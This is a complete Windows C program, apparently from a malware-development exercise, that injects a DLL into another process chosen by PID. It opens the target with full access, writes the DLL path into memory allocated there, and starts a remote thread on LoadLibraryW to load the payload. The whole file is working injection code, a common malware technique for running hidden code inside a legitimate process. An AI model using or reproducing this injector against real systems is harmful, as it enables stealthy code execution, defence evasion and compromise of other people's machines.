#include <Windows.h>
#include <stdio.h>

#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define info(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__)
#define fail(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)

DWORD PID = NULL;
DWORD TID = NULL;
HANDLE hProcess = NULL;
HANDLE hThread = NULL;
LPVOID rBuffer = NULL;
HMODULE hKerenel32 = NULL;

wchar_t dllPath[MAX_PATH] = L"C:\\Dev\\MalDev\\x64\\Release\\RandomDLL.dll";
size_t dllPathSize = sizeof(dllPath);

int main(int argc, char* argv[])
{
	if (argc < 2)
	{
		fail("usage: program.exe <PID>");
		return EXIT_FAILURE;
	}

	PID = atoi(argv[1]);

	info("Getting handle to process (%ld)", PID);

	/* open a handle to the process */
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

	if (!hProcess)
	{
		fail("Unable to open handle to the process (%ld) error: %ld", PID, GetLastError());
		return EXIT_FAILURE;
	}

	info("Got a handle to the process 0x%p", hProcess);

	/* allocate memory in process */
	rBuffer = VirtualAllocEx(hProcess, NULL, dllPathSize, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
	info("Allocated %zu-bytes with r/w permissions", dllPathSize);

	if (!rBuffer)
	{
		fail("couldn't create rBuffer. error: %ld", GetLastError());
		return EXIT_FAILURE;
	}

	WriteProcessMemory(hProcess, rBuffer, dllPath, dllPathSize, NULL);
	info("Wrote %zu-bytes to process memory - creating and running thread on injected DLL", dllPathSize);

	hKerenel32 = GetModuleHandleW(L"Kernel32");

	if (!hKerenel32)
	{
		fail("Failed to get handle to Kernel32.dll. Error: %ld", GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}

	okay("Got a handle to Kernel32.dll 0x%p", hKerenel32);

	/* Find & load libray function */
	LPTHREAD_START_ROUTINE startThis = (LPTHREAD_START_ROUTINE)GetProcAddress(hKerenel32, "LoadLibraryW");
	info("Got the address of LoadLibraryW() 0x%p", startThis);

	/* create thread to run our payload */
	hThread = CreateRemoteThread(hProcess, NULL, 0, startThis, rBuffer, 0, &TID);


	if (!hThread)
	{
		fail("Unable to get a handle to thread. error: %ld", GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}

	okay("Successfully created thread. Handle: 0x%p Thread PID: %ld", hThread, TID);

	info("Waiting for thread to finish executing");
	//dangerous - don't wait for infinity normally
	WaitForSingleObject(hThread, INFINITE);
	okay("thread finished executing");

	CloseHandle(hThread);
	CloseHandle(hProcess);
	okay("Finished! see you next time :3");
	return EXIT_SUCCESS;
}